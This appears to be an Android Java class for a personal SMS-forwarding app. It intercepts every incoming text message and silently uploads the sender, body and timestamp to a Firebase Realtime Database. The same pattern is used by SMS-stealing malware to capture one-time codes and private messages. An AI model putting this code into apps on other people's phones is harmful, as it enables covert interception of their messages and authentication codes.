package com.example.mysmsforwarder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = smsMessage.getDisplayOriginatingAddress();
                        String messageBody = smsMessage.getMessageBody();

                        // إرسال البيانات مباشرة إلى قاعدة بيانات Firebase Realtime Database
                        DatabaseReference databaseRef = FirebaseDatabase.getInstance().getReference("Inbox");
                        String messageId = databaseRef.push().getKey();
                        
                        if (messageId != null) {
                            databaseRef.child(messageId).child("sender").setValue(sender);
                            databaseRef.child(messageId).child("message").setValue(messageBody);
                            databaseRef.child(messageId).child("timestamp").setValue(System.currentTimeMillis());
                        }
                    }
                }
            }
        }
    }
}
